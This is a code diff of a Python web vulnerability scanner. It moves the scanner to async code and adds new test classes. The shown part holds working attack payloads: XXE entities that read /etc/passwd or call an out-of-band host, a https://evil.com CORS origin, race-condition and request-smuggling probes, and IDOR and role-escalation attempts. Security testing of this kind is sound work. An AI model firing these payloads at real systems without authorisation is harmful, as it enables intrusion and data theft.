                 """Step 2: Confirm with different data before Step 1 commits"""
                 await asyncio.sleep(0.1)  # Tiny delay to race with commit
@@ -5161,21 +6836,21 @@ class OmegaDAST:
                         response_data = await resp.json()
                         final_amount = response_data.get("amount")
                         final_beneficiary = response_data.get("beneficiary_id")
-                        
+
                         if final_amount == malicious_amount or final_beneficiary == malicious_beneficiary:
                             results["race_won"] = True
                             logging.info(f"[TWO-PHASE] Race won! Transaction used malicious data")
                     except:
                         pass
                 return resp
-            
+
             # Execute race condition
             transaction_id = await initiate_transaction()
             if transaction_id:
                 await confirm_with_race(transaction_id)
             
             if results["race_won"]:
-                self._add_vulnerability({
+                await self._add_vulnerability({
                     "type": "Two-Phase Transaction Race Condition",
                     "url": initiate_url,
                     "parameter": "amount,beneficiary_id",
@@ -5219,10 +6894,15 @@ class OmegaDAST:
                     "response": resp.text if resp else None
                 }
             
-            # Send 50 concurrent requests using asyncio.gather()
+            # Send 50 concurrent requests using asyncio.wait with timeout
             request_ids = [f"req_{i}_{uuid.uuid4().hex[:8]}" for i in range(50)]
             tasks = [single_purchase(rid) for rid in request_ids]
-            results = await asyncio.gather(*tasks)
+            done, pending = await asyncio.wait(tasks, timeout=120, return_when=asyncio.ALL_COMPLETED)
+            if pending:
+                for task in pending:
+                    task.cancel()
+                logging.warning(f"{len(pending)} inventory oversell test tasks timed out")
+            results = [task.result() for task in done if not task.cancelled()]
             
             # Analyze results
             successful = [r for r in results if r["success"]]
@@ -5244,7 +6924,7 @@ class OmegaDAST:
             # Determine if lock is broken
             if success_count == 50:
                 # ALL requests succeeded - CRITICAL: no atomic locking
-                self._add_vulnerability({
+                await self._add_vulnerability({
                     "type": "Inventory Oversell (Double Spend)",
                     "url": purchase_url,
                     "parameter": "product_id,quantity",
@@ -5259,7 +6939,7 @@ class OmegaDAST:
                 logging.info(f"[INVENTORY OVERSELL] Lock appears atomic: {success_count} succeeded, {len(out_of_stock_errors)} failed with 'Out of Stock'")
             elif success_count > 1:
                 # Multiple succeeded but no clear out of stock message - potential issue
-                self._add_vulnerability({
+                await self._add_vulnerability({
                     "type": "Potential Inventory Oversell",
                     "url": purchase_url,
                     "parameter": "product_id,quantity",
@@ -5280,7 +6960,6 @@ class OmegaDAST:
             }
         except Exception as e:
             logging.warning(f"Inventory oversell test error: {e}")
-
     # --- Request Smuggling ---
     async def request_smuggling_tests(self):
         for scheme, header_map in PAYLOADS["RequestSmuggling"].items():
@@ -5302,9 +6981,7 @@ class OmegaDAST:
                 
                 if is_ssl:
                     import ssl
-                    ssl_context = ssl.create_default_context()
-                    ssl_context.check_hostname = False
-                    ssl_context.verify_mode = ssl.CERT_NONE
+                    ssl_context = create_ssl_context(verify=False)
                     reader, writer = await asyncio.open_connection(host, port, ssl=ssl_context)
                 else:
                     reader, writer = await asyncio.open_connection(host, port)
@@ -5319,14 +6996,14 @@ class OmegaDAST:
                 
                 response_str = response.decode('utf-8', errors='ignore')
                 if 'error' in response_str.lower() or response_str.startswith('HTTP/1.1 400') or response_str.startswith('HTTP/1.1 500'):
-                    self._add_vulnerability({
+                    await self._add_vulnerability({
                         "type":"Request Smuggling","url":self.target,"parameter":"*",
                         "evidence":f"{scheme} caused internal error or bad request",
                         "severity":"Critical","confidence":80,"cwe":CWE_MAP["RequestSmuggling"]
                     })
                 # CL.0 specific: Check if backend processed request differently than frontend
                 if scheme == "CL.0" and response_str.startswith('HTTP/1.1 200'):
-                    self._add_vulnerability({
+                    await self._add_vulnerability({
                         "type":"CL.0 Bypass","url":self.target,"parameter":"*",
                         "evidence":"GET with Content-Length: 0 accepted - potential Frontend->Backend bypass",
                         "severity":"High","confidence":75,"cwe":CWE_MAP["RequestSmuggling"]
@@ -5384,9 +7061,7 @@ class OmegaDAST:
                 try:
                     if is_ssl:
                         import ssl
-                        ssl_context = ssl.create_default_context()
-                        ssl_context.check_hostname = False
-                        ssl_context.verify_mode = ssl.CERT_NONE
+                        ssl_context = create_ssl_context(verify=False)
                         reader, writer = await asyncio.open_connection(host, port, ssl=ssl_context)
                     else:
                         reader, writer = await asyncio.open_connection(host, port)
@@ -5404,7 +7079,7 @@ class OmegaDAST:
                     
                     # Check for successful response or interesting behavior
                     if response_str.startswith('HTTP/1.1 200') or 'admin' in response_str.lower() or 'internal' in response_str.lower():
-                        self._add_vulnerability({
+                        await self._add_vulnerability({
                             "type":"HTTP/2 Downgrade","url":self.target,"parameter":"*",
                             "evidence":f"Malformed header accepted during HTTP/2 downgrade: {header[:50]}",
                             "severity":"High","confidence":70,"cwe":"CWE-444"
@@ -5419,9 +7094,7 @@ class OmegaDAST:
             try:
                 if is_ssl:
                     import ssl
-                    ssl_context = ssl.create_default_context()
-                    ssl_context.check_hostname = False
-                    ssl_context.verify_mode = ssl.CERT_NONE
+                    ssl_context = create_ssl_context(verify=False)
                     reader, writer = await asyncio.open_connection(host, port, ssl=ssl_context)
                 else:
                     reader, writer = await asyncio.open_connection(host, port)
@@ -5437,7 +7110,7 @@ class OmegaDAST:
                 
                 response_str = response.decode('utf-8', errors='ignore')
                 if response_str.startswith('HTTP/1.1 200'):
-                    self._add_vulnerability({
+                    await self._add_vulnerability({
                         "type":"HTTP/2 Protocol Confusion","url":self.target,"parameter":"*",
                         "evidence":"HTTP/2 pseudo-headers accepted in HTTP/1.1 request",
                         "severity":"Medium","confidence":65,"cwe":"CWE-444"
@@ -5450,19 +7123,19 @@ class OmegaDAST:
 
     # --- IDOR ---
     async def run_idor_tests(self):
-        for url in self.visited_urls:
+        for url in self.crawler_engine.visited_urls:
             # Numeric ID in path
             for match in re.finditer(r'/(\d+)', urlparse(url).path):
                 uid = match.group(1)
                 try:
                     new_id = str(int(uid) + 1)
                     new_url = url[:match.start(1)] + new_id + url[match.end(1):]
-                    if new_url in self.visited_urls: continue
+                    if new_url in self.crawler_engine.visited_urls: continue
                     resp_orig = await self._async_fetch(url)
                     resp_new = await self._async_fetch(new_url)
                     if resp_new and resp_new.status == 200 and len(resp_new._body) > 100:
                         if resp_orig and self.token_normalizer.normalize(resp_new._body) != self.token_normalizer.normalize(resp_orig._body):
-                            self._add_vulnerability({
+                            await self._add_vulnerability({
                                 "type":"IDOR","url":url,"parameter":f"ID {uid}",
                                 "evidence":"Access to different ID returned different content",
                                 "severity":"High","confidence":85,"cwe":CWE_MAP["IDOR"]
@@ -5474,23 +7147,23 @@ class OmegaDAST:
             for match in re.finditer(uuid_pattern, url, re.I):
                 new_uuid = str(uuid.uuid4())
                 new_url = url[:match.start()] + new_uuid + url[match.end():]
-                if new_url in self.visited_urls: continue
+                if new_url in self.crawler_engine.visited_urls: continue
                 resp_new = await self._async_fetch(new_url)
                 if resp_new and resp_new.status == 200 and len(resp_new._body) > 100:
-                    self._add_vulnerability({
+                    await self._add_vulnerability({
                         "type":"IDOR (UUID)","url":url,"parameter":"UUID",
                         "evidence":"Access with different UUID returned content",
                         "severity":"High","confidence":80,"cwe":CWE_MAP["IDOR"]
                     })
             # Parameter-based ID
-            for param in self.parameters:
+            for param in self.crawler_engine.parameters:
                 if param['url'] == url and param['method'] == 'POST' and re.search(r'id$|user|account|profile', param['param'], re.I):
                     pname = param['param']
                     resp_base = await self._async_fetch(url, method='POST', data={pname: '1'})
                     if resp_base:
                         resp_test = await self._async_fetch(url, method='POST', data={pname: '9999'})
                         if resp_test and resp_test.status == 200 and self.token_normalizer.normalize(resp_test._body) != self.token_normalizer.normalize(resp_base._body):
-                            self._add_vulnerability({
+                            await self._add_vulnerability({
                                 "type":"IDOR (Param)","url":url,"parameter":pname,
                                 "evidence":"Parameter change gave different response",
                                 "severity":"High","confidence":60,"cwe":CWE_MAP["IDOR"]
@@ -5499,11 +7172,11 @@ class OmegaDAST:
     async def test_org_user_id_mismatch(self):
         """Test for ORG_ID vs USER_ID MISMATCH - Organization boundary bypass"""
         self.log("Testing ORG_ID vs USER_ID mismatch...")
-        for url in self.visited_urls:
+        for url in self.crawler_engine.visited_urls:
             if self.stop_event.is_set():
                 break
             # Look for endpoints with both org_id and user_id parameters
-            for param in self.parameters:
+            for param in self.crawler_engine.parameters:
                 if param['url'] == url and 'org_id' in param['param'].lower():
                     # Try to swap org_id while keeping user_id from different org
                     base_resp = await self._async_fetch(url, method=param['method'], 
@@ -5517,7 +7190,7 @@ class OmegaDAST:
                                                         if param['method'] == 'POST' else None)
                     if test_resp and test_resp.status == 200:
                         if base_resp and self.token_normalizer.normalize(test_resp._body) != self.token_normalizer.normalize(base_resp._body):
-                            self._add_vulnerability({
+                            await self._add_vulnerability({
                                 "type":"IDOR (Org-User Mismatch)","url":url,"parameter":param['param'],
                                 "evidence":"Organization boundary bypass - different org_id returned data",
                                 "severity":"Critical","confidence":85,"cwe":CWE_MAP["IDOR"]
@@ -5526,12 +7199,12 @@ class OmegaDAST:
     async def test_role_hierarchy_escalation(self):
         """Test for ROLE HIERARCHY ESCALATION - Role modification abuse"""
         self.log("Testing role hierarchy escalation...")
-        for url in self.visited_urls:
+        for url in self.crawler_engine.visited_urls:
             if self.stop_event.is_set():
                 break
             # Look for role modification endpoints
             if re.search(r'/users/[^/]+/role|/role|/permissions', url, re.I):
-                for param in self.parameters:
+                for param in self.crawler_engine.parameters:
                     if param['url'] == url and 'role' in param['param'].lower():
                         # Try escalating from lower to higher privilege
                         role_payloads = [
@@ -5546,7 +7219,7 @@ class OmegaDAST:
                                                                 data=payload if param['type'] != 'json' else None)
                             if test_resp and test_resp.status in [200, 201, 202]:
                                 if any(ind in test_resp._body.lower() for ind in ['admin', 'success', 'updated', 'granted']):
-                                    self._add_vulnerability({
+                                    await self._add_vulnerability({
                                         "type":"IDOR (Role Escalation)","url":url,"parameter":param['param'],
                                         "evidence":f"Role escalation succeeded - payload: {payload}",
                                         "severity":"Critical","confidence":80,"cwe":CWE_MAP["IDOR"]
@@ -5556,7 +7229,7 @@ class OmegaDAST:
     async def test_array_bulk_idor(self):
         """Test for ARRAY-BASED BULK IDOR - Mass assignment with unrelated IDs"""
         self.log("Testing array-based bulk IDOR...")
-        for param in self.parameters:
+        for param in self.crawler_engine.parameters:
             if param['method'] != 'POST':
                 continue
             if 'ids' in param['param'].lower() or re.search(r'id\[\]|list.*id', param['param'], re.I):
@@ -5575,7 +7248,7 @@ class OmegaDAST:
                     if test_resp and test_resp.status == 200:
                         # Check if response contains data for all IDs including the unrelated one
                         if any(str(id) in test_resp._body for id in [9999, 99999]):
-                            self._add_vulnerability({
+                            await self._add_vulnerability({
                                 "type":"IDOR (Bulk Array)","url":url,"parameter":param['param'],
                                 "evidence":f"Mass assignment returned data for unrelated IDs - payload: {payload}",
                                 "severity":"Critical","confidence":90,"cwe":CWE_MAP["IDOR"]
@@ -5584,7 +7257,7 @@ class OmegaDAST:
 
     # --- Mass Assignment ---
     async def run_mass_assignment_tests(self):
-        for param in self.parameters:
+        for param in self.crawler_engine.parameters:
             if param['method'] != 'POST': continue
             url = param['url']; pname = param['param']; ptype = param['type']
             if ptype != 'json':
@@ -5605,7 +7278,7 @@ class OmegaDAST:
                         resp = await self._async_fetch(url, method='POST', data=data)
                     if resp and self.token_normalizer.normalize(resp._body) != base_text:
                         if any(ind in resp._body.lower() for ind in ['admin','role','access','success','welcome','dashboard']):
-                            self._add_vulnerability({
+                            await self._add_vulnerability({
                                 "type":"MassAssignment","url":url,"parameter":pname,
                                 "evidence":f"Extra fields {list(extra_set.keys())} changed response",
                                 "severity":"High","confidence":75,"cwe":CWE_MAP["MassAssignment"]
@@ -5614,8 +7287,12 @@ class OmegaDAST:
 
     # --- CSRF ---
     async def run_csrf_checks(self):
-        for page in self.crawled_pages:
-            soup = page['soup']
+        for page in self.crawler_engine.crawled_pages:
+            page_data = await self.loop.run_in_executor(None, self.scan_state_manager.get_page_hash, page['url'])
+            if not page_data:
+                continue
+            html = page_data.get('html_content', '')
+            soup = BeautifulSoup(html, 'html.parser')
             for form in soup.find_all('form', method=lambda m: m and m.lower() == 'post'):
                 form_text = form.get_text().lower()
                 if any(w in form_text for w in ['delete','remove','logout','reset','wipe']):
@@ -5635,7 +7312,7 @@ class OmegaDAST:
                             data[name] = inp.get('value','test')
                     resp = await self._async_fetch(action, method='POST', data=data)
                     if resp and resp.status not in (403,401) and 'invalid' not in resp._body.lower():
-                        self._add_vulnerability({
+                        await self._add_vulnerability({
                             "type":"CSRF Confirmed","url":page['url'],"parameter":"form",
                             "evidence":"POST succeeded without CSRF token",
                             "severity":"High","confidence":90,"cwe":CWE_MAP["CSRF"]
@@ -5643,7 +7320,7 @@ class OmegaDAST:
 
     # --- CORS with credentials ---
     async def run_cors_checks(self):
-        for url in self.visited_urls:
+        for url in self.crawler_engine.visited_urls:
             for origin in ["null", "https://evil.com"]:
                 headers = {"Origin": origin}
                 resp = await self._async_fetch(url, method='OPTIONS', headers=headers)
@@ -5660,13 +7337,13 @@ class OmegaDAST:
                             """
                             result = await self.loop.run_in_executor(None, self.selenium_driver.execute_js, script)
                             if result and 'SUCCESS' in result:
-                                self._add_vulnerability({
+                                await self._add_vulnerability({
                                     "type":"CORS (Credentialed)","url":url,
                                     "evidence":f"Origin {origin} allowed with credentials",
                                     "severity":"High","confidence":85,"cwe":CWE_MAP["CORS"]
                                 })
                             else:
-                                self._add_vulnerability({
+                                await self._add_vulnerability({
                                     "type":"CORS Misconfiguration","url":url,"evidence":f"ACAO: {acao}",
                                     "severity":"Medium","confidence":70,"cwe":CWE_MAP["CORS"]
                                 })
@@ -5679,7 +7356,7 @@ class OmegaDAST:
         self.log("Starting HTTP method vulnerability tests...")
         
         # Test URLs from crawled pages
-        test_urls = list(self.visited_urls)[:20]  # Limit to first 20 URLs for efficiency
+        test_urls = list(self.crawler_engine.visited_urls)[:20]  # Limit to first 20 URLs for efficiency
         
         for url in test_urls:
             if self.stop_event.is_set():
@@ -5721,18 +7398,18 @@ class OmegaDAST:
                 if resp:
                     result = Detector.put_file_upload(resp, baseline_resp, url, test_payload)
                     if result:
-                        self._add_vulnerability({**result, "url": url, "payload": test_payload})
+                        await self._add_vulnerability({**result, "url": url, "payload": test_payload})
                     
                     result = Detector.put_resource_overwrite(resp, baseline_resp, url)
                     if result:
-                        self._add_vulnerability({**result, "url": url, "payload": test_payload})
+                        await self._add_vulnerability({**result, "url": url, "payload": test_payload})
                     
                     # Check OOB callbacks
-                    time.sleep(0.3)
+                    await asyncio.sleep(0.3)
                     with oob_results_lock:
                         for res in oob_results:
                             if marker in res['path']:
-                                self._add_vulnerability({
+                                await self._add_vulnerability({
                                     "type": "PUT OOB Callback",
                                     "confidence": 95,
                                     "evidence": f"OOB callback: {res['path']}",
@@ -5759,11 +7436,19 @@ class OmegaDAST:
                 if self.stop_event.is_set():
                     break
                     
-                resp = await self._async_fetch(url, method='PATCH', json_data=json.loads(payload))
+                try:
+                    json_data = json.loads(payload)
+                except json.JSONDecodeError:
+                    # Fallback to URL-encoded data if JSON parsing fails
+                    json_data = None
+                    resp = await self._async_fetch(url, method='PATCH', data=payload)
+                else:
+                    resp = await self._async_fetch(url, method='PATCH', json_data=json_data)
+                
                 if resp:
                     result = Detector.patch_mass_assignment(resp, baseline_resp, payload)
                     if result:
-                        self._add_vulnerability({**result, "url": url, "payload": payload})
+                        await self._add_vulnerability({**result, "url": url, "payload": payload})
             
             # Test validation bypass payloads
             validation_payloads = [
@@ -5776,11 +7461,19 @@ class OmegaDAST:
                 if self.stop_event.is_set():
                     break
                     
-                resp = await self._async_fetch(url, method='PATCH', json_data=json.loads(payload))
+                try:
+                    json_data = json.loads(payload)
+                except json.JSONDecodeError:
+                    # Fallback to URL-encoded data if JSON parsing fails
+                    json_data = None
+                    resp = await self._async_fetch(url, method='PATCH', data=payload)
+                else:
+                    resp = await self._async_fetch(url, method='PATCH', json_data=json_data)
+                    
                 if resp:
                     result = Detector.patch_validation_bypass(resp, baseline_resp, payload)
                     if result:
-                        self._add_vulnerability({**result, "url": url, "payload": payload})
+                        await self._add_vulnerability({**result, "url": url, "payload": payload})
                         
         except Exception as e:
             logging.warning(f"PATCH method test error for {url}: {e}")
@@ -5809,7 +7502,7 @@ class OmegaDAST:
                 if resp:
                     result = Detector.post_stored_xss(resp, baseline_resp, test_payload, oob_results, marker)
                     if result:
-                        self._add_vulnerability({**result, "url": url, "payload": test_payload})
+                        await self._add_vulnerability({**result, "url": url, "payload": test_payload})
             
             # Test authentication bypass
             auth_payloads = [
@@ -5826,7 +7519,7 @@ class OmegaDAST:
                 if resp:
                     result = Detector.post_auth_bypass(resp, baseline_resp, url)
                     if result:
-                        self._add_vulnerability({**result, "url": url, "payload": str(payload)})
+                        await self._add_vulnerability({**result, "url": url, "payload": str(payload)})
             
             # Test command injection
             cmd_payloads = [
@@ -5844,7 +7537,7 @@ class OmegaDAST:
                 if resp:
                     result = Detector.post_command_injection(resp, baseline_resp, payload)
                     if result:
-                        self._add_vulnerability({**result, "url": url, "payload": payload})
+                        await self._add_vulnerability({**result, "url": url, "payload": payload})
                         
         except Exception as e:
             logging.warning(f"POST method test error for {url}: {e}")
@@ -5869,7 +7562,7 @@ class OmegaDAST:
                     if resp:
                         result = Detector.get_idor(resp, baseline_resp, test_url, test_id)
                         if result:
-                            self._add_vulnerability({**result, "url": test_url})
+                            await self._add_vulnerability({**result, "url": test_url})
             
             # Test parameter pollution
             parsed = urlparse(url)
@@ -5886,12 +7579,12 @@ class OmegaDAST:
                 if resp:
                     result = Detector.get_parameter_pollution(resp, baseline_resp, polluted_url)
                     if result:
-                        self._add_vulnerability({**result, "url": polluted_url})
+                        await self._add_vulnerability({**result, "url": polluted_url})
             
             # Test cache poisoning potential
             result = Detector.get_cache_poisoning(baseline_resp, None, url)
             if result:
-                self._add_vulnerability({**result, "url": url})
+                await self._add_vulnerability({**result, "url": url})
                 
         except Exception as e:
             logging.warning(f"GET method test error for {url}: {e}")
@@ -5906,7 +7599,7 @@ class OmegaDAST:
             if resp:
                 result = Detector.delete_unauthorized(resp, baseline_resp, url)
                 if result:
-                    self._add_vulnerability({**result, "url": url})
+                    await self._add_vulnerability({**result, "url": url})
             
             # Test DELETE IDOR
             id_pattern = re.search(r'/(\d+)', url)
@@ -5919,13 +7612,13 @@ class OmegaDAST:
                 if resp:
                     result = Detector.delete_idor(resp, baseline_resp, test_url, test_id)
                     if result:
-                        self._add_vulnerability({**result, "url": test_url})
+                        await self._add_vulnerability({**result, "url": test_url})
             
             # Test cascading deletion
             if resp:
                 result = Detector.delete_cascading(resp, baseline_resp, url)
                 if result:
-                    self._add_vulnerability({**result, "url": url})
+                    await self._add_vulnerability({**result, "url": url})
                     
         except Exception as e:
             logging.warning(f"DELETE method test error for {url}: {e}")
@@ -5940,11 +7633,11 @@ class OmegaDAST:
             if resp:
                 result = Detector.options_info_disclosure(resp, baseline_resp, url)
                 if result:
-                    self._add_vulnerability({**result, "url": url})
+                    await self._add_vulnerability({**result, "url": url})
                 
                 result = Detector.options_method_tampering(resp, baseline_resp, url)
                 if result:
-                    self._add_vulnerability({**result, "url": url})
+                    await self._add_vulnerability({**result, "url": url})
                     
         except Exception as e:
             logging.warning(f"OPTIONS method test error for {url}: {e}")
@@ -5982,9 +7675,16 @@ class OmegaDAST:
         jira_url = self.config.get('jira_webhook')
         if jira_url:
             try:
-                async with aiohttp.ClientSession() as session:
-                    await session.post(jira_url, json={"title": f"UltraDAST found {vuln['type']}", "description": json.dumps(vuln)})
-                    self.log(f"JIRA alert sent for {vuln['type']}")
+                if self.session_manager and self.session_manager.async_session:
+                    # Reuse existing connection pool
+                    async with self.session_manager.async_session.session.request('POST', jira_url, json={"title": f"UltraDAST found {vuln['type']}", "description": json.dumps(vuln)}) as resp:
+                        if resp.status == 200:
+                            self.log(f"JIRA alert sent for {vuln['type']}")
+                else:
+                    # Fallback to new session
+                    async with aiohttp.ClientSession() as session:
+                        await session.post(jira_url, json={"title": f"UltraDAST found {vuln['type']}", "description": json.dumps(vuln)})
+                        self.log(f"JIRA alert sent for {vuln['type']}")
             except Exception as e:
                 self.log(f"Failed to send JIRA alert: {e}")
 
@@ -5992,14 +7692,21 @@ class OmegaDAST:
         slack_url = self.config.get('slack_webhook')
         if slack_url:
             try:
-                async with aiohttp.ClientSession() as session:
-                    await session.post(slack_url, json={"text": f"*{vuln['type']}* on {vuln['url']}\nEvidence: {vuln.get('evidence','')}"})
-                    self.log(f"Slack alert sent for {vuln['type']}")
+                if self.session_manager and self.session_manager.async_session:
+                    # Reuse existing connection pool
+                    async with self.session_manager.async_session.session.request('POST', slack_url, json={"text": f"*{vuln['type']}* on {vuln['url']}\nEvidence: {vuln.get('evidence','')}"}) as resp:
+                        if resp.status == 200:
+                            self.log(f"Slack alert sent for {vuln['type']}")
+                else:
+                    # Fallback to new session
+                    async with aiohttp.ClientSession() as session:
+                        await session.post(slack_url, json={"text": f"*{vuln['type']}* on {vuln['url']}\nEvidence: {vuln.get('evidence','')}"})
+                        self.log(f"Slack alert sent for {vuln['type']}")
             except Exception as e:
                 self.log(f"Failed to send Slack alert: {e}")
 
-    def _add_vulnerability(self, vuln):
-        if self.fp_db.is_fp(vuln):
+    async def _add_vulnerability(self, vuln):
+        if await self.fp_db.is_fp(vuln):
             return
         conf = vuln.get('confidence', 0)
         if conf < self.config.get('confidence_threshold', DEFAULT_CONFIDENCE_THRESHOLD):
@@ -6060,12 +7767,12 @@ class OmegaDAST:
             vuln['poc_curl'] = pocs['curl']
             vuln['poc_python'] = pocs['python']
         
-        for v in self.vulnerabilities:
+        for v in self.reporting_engine.vulnerabilities:
             if v['type']==vuln['type'] and v['url']==vuln['url'] and v.get('parameter')==vuln.get('parameter'):
                 if vuln['confidence'] > v['confidence']:
                     v.update(vuln)
                 return
-        self.vulnerabilities.append(vuln)
+        self.reporting_engine.vulnerabilities.append(vuln)
         self.log(f"[+] {vuln['type']} ({vuln.get('confidence')}%): {vuln['url']} [{vuln.get('parameter','')}]")
         self.add_finding(vuln)
         if vuln.get('severity') in ('Critical','High'):
@@ -6090,7 +7797,7 @@ class OmegaDAST:
             final_confidence = validated_vuln.get('confidence', vuln.get('confidence', 0))
             
             # Update existing vulnerability
-            for v in self.vulnerabilities:
+            for v in self.reporting_engine.vulnerabilities:
                 if (v['type'] == vuln['type'] and 
                     v['url'] == vuln['url'] and 
                     v.get('parameter') == vuln.get('parameter')):
@@ -6135,85 +7842,6 @@ class OmegaDAST:
             self.vulnerability_timestamps[(vuln_type, url, param)] = current_time
         
         self.log(f"Temporal recheck completed for {len(recheck_candidates)} vulnerabilities")
-
-class DistributedWorker:
-    def __init__(self, redis_host='localhost', redis_port=6379, worker_id=None):
-        self.redis_host = redis_host
-        self.redis_port = redis_port
-        self.worker_id = worker_id or str(uuid.uuid4())
-        self.redis_client = None
-        self.running = False
-    
-    def connect(self):
-        try:
-            import redis
-            self.redis_client = redis.Redis(host=self.redis_host, port=self.redis_port, decode_responses=True)
-            self.redis_client.ping()
-            return True
-        except ImportError:
-            logging.error("Redis library not installed. Install with: pip install redis")
-            return False
-        except Exception as e:
-            logging.error(f"Redis connection error: {e}")
-            return False
-    
-    def start_worker(self, task_callback):
-        """Start worker to process tasks from Redis queue"""
-        if not self.connect():
-            return False
-        
-        self.running = True
-        while self.running:
-            try:
-                # Pop task from queue
-                task = self.redis_client.brpop('scan_tasks', timeout=5)
-                if task:
-                    _, task_data = task
-                    task = json.loads(task_data)
-                    result = task_callback(task)
-                    
-                    # Push result back
-                    result_data = {
-                        'worker_id': self.worker_id,
-                        'task_id': task.get('task_id'),
-                        'result': result,
-                        'timestamp': datetime.now().isoformat()
-                    }
-                    self.redis_client.lpush('scan_results', json.dumps(result_data))
-            except Exception as e:
-                logging.warning(f"Worker error: {e}")
-        return True
-    
-    def stop_worker(self):
-        self.running = False
-    
-    def submit_task(self, task):
-        """Submit a task to the Redis queue (master mode)"""
-        if not self.connect():
-            return False
-        
-        task['task_id'] = str(uuid.uuid4())
-        task['submitted_at'] = datetime.now().isoformat()
-        self.redis_client.lpush('scan_tasks', json.dumps(task))
-        return task['task_id']
-    
-    def get_results(self, task_id=None, timeout=30):
-        """Get results from Redis queue"""
-        if not self.connect():
-            return []
-        
-        results = []
-        start_time = time.time()
-        
-        while time.time() - start_time < timeout:
-            result = self.redis_client.brpop('scan_results', timeout=1)
-            if result:
-                _, result_data = result
-                result = json.loads(result_data)
-                if task_id is None or result.get('task_id') == task_id:
-                    results.append(result)
-        
-        return results
 
 class SubdomainDiscovery:
     def __init__(self):
@@ -6348,6 +7976,191 @@ class SubdomainDiscovery:
     def log(self, msg):
         logging.info(msg)
 
+class ContentTypeAmbiguityAttack:
+    """Test for content-type ambiguity vulnerabilities"""
+    
+    def __init__(self, session_manager):
+        self.session_manager = session_manager
+    
+    async def test(self, url):
+        """Test content-type ambiguity by sending conflicting headers"""
+        try:
+            payloads = [
+                {'Content-Type': 'application/json', 'body': '<?xml version="1.0"?><test>data</test>'},
+                {'Content-Type': 'text/xml', 'body': '{"test":"data"}'},
+                {'Content-Type': 'application/xml', 'body': '{"test":"data"}'},
+                {'Content-Type': 'text/html', 'body': '<?xml version="1.0"?><test>data</test>'},
+            ]
+            
+            for payload in payloads:
+                resp = await self._send_request(url, payload)
+                if resp and self._detect_ambiguity(resp):
+                    return {
+                        "type": "Content-Type Ambiguity",
+                        "url": url,
+                        "evidence": f"Server accepted conflicting content-type: {payload['Content-Type']}",
+                        "severity": "Medium",
+                        "confidence": 75,
+                        "cwe": CWE_MAP.get("Content-Type", "CWE-434")
+                    }
+        except Exception as e:
+            logging.warning(f"Content-Type ambiguity test error: {e}")
+        return None
+    
+    async def _send_request(self, url, payload):
+        if not self.session_manager or not self.session_manager.async_session:
+            return None
+        try:
+            async with self.session_manager.async_session.session.request(
+                'POST', url, 
+                headers={'Content-Type': payload['Content-Type']},
+                data=payload['body'],
+                timeout=aiohttp.ClientTimeout(total=10)
+            ) as resp:
+                body = await resp.text()
+                resp._body = body
+                return resp
+        except Exception:
+            return None
+    
+    def _detect_ambiguity(self, resp):
+        """Detect if server processed content ambiguously"""
+        content_type = resp.headers.get('Content-Type', '')
+        body_lower = resp._body.lower()
+        # Check if response contains error or unexpected parsing
+        return 'error' in body_lower or 'parse' in body_lower or 'invalid' in body_lower
+
+class ProtobufThriftAmbiguityAttack:
+    """Test for protobuf/thrift deserialization ambiguity"""
+    
+    def __init__(self, session_manager):
+        self.session_manager = session_manager
+    
+    async def test(self, url):
+        """Test protobuf/thrift ambiguity with malformed binary data"""
+        try:
+            # Send malformed protobuf-like data
+            payloads = [
+                b'\x08\x01\x12\x03mal',  # Malformed protobuf
+                b'\x00\x01\x00\x02\x00\x03\x00\x04',  # Malformed thrift-like data
+                b'\x0a\x03\x00\x00\x00\x00',  # Another malformed pattern
+            ]
+            
+            for payload in payloads:
+                resp = await self._send_request(url, payload)
+                if resp and self._detect_deserialization_issue(resp):
+                    return {
+                        "type": "Protobuf/Thrift Deserialization Ambiguity",
+                        "url": url,
+                        "evidence": "Server accepted malformed binary data",
+                        "severity": "High",
+                        "confidence": 70,
+                        "cwe": CWE_MAP.get("Deserialization", "CWE-502")
+                    }
+        except Exception as e:
+            logging.warning(f"Protobuf/Thrift ambiguity test error: {e}")
+        return None
+    
+    async def _send_request(self, url, payload):
+        if not self.session_manager or not self.session_manager.async_session:
+            return None
+        try:
+            async with self.session_manager.async_session.session.request(
+                'POST', url,
+                data=payload,
+                headers={'Content-Type': 'application/x-protobuf'},
+                timeout=aiohttp.ClientTimeout(total=10)
+            ) as resp:
+                body = await resp.text()
+                resp._body = body
+                return resp
+        except Exception:
+            return None
+    
+    def _detect_deserialization_issue(self, resp):
+        """Detect deserialization issues"""
+        body_lower = resp._body.lower()
+        return any(err in body_lower for err in ['error', 'exception', 'invalid', 'parse', 'deserialize'])
+
+class SoapXXEAttack:
+    """Test for SOAP XXE vulnerabilities"""
+    
+    def __init__(self, session_manager, oob_manager):
+        self.session_manager = session_manager
+        self.oob_manager = oob_manager
+    
+    async def test(self, url):
+        """Test SOAP XXE with various XML entities"""
+        try:
+            oob_domain = getattr(self.oob_manager, 'oob_dns_domain', 'oob.example.com')
+            marker = f"soap_xxe_{uuid.uuid4().hex[:8]}"
+            oob_url = f"http://{marker}.{oob_domain}"
+            
+            payloads = [
+                f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "{oob_url}">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>',
+                f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>',
+                f'<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{oob_url}">%xxe;]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>test</test></soap:Body></soap:Envelope>',
+            ]
+            
+            for payload in payloads:
+                resp = await self._send_request(url, payload)
+                if resp:
+                    # Check for XXE indicators
+                    if self._detect_xxe(resp):
+                        return {
+                            "type": "SOAP XXE",
+                            "url": url,
+                            "evidence": "XXE vulnerability detected in SOAP endpoint",
+                            "severity": "Critical",
+                            "confidence": 85,
+                            "cwe": CWE_MAP["XXE"]
+                        }
+                    
+                    # Wait for OOB callback
+                    await asyncio.sleep(2)
+                    if self._check_oob_callback(marker):
+                        return {
+                            "type": "SOAP XXE (OOB)",
+                            "url": url,
+                            "evidence": f"OOB callback received: {marker}",
+                            "severity": "Critical",
+                            "confidence": 95,
+                            "cwe": CWE_MAP["XXE"]
+                        }
+        except Exception as e:
+            logging.warning(f"SOAP XXE test error: {e}")
+        return None
+    
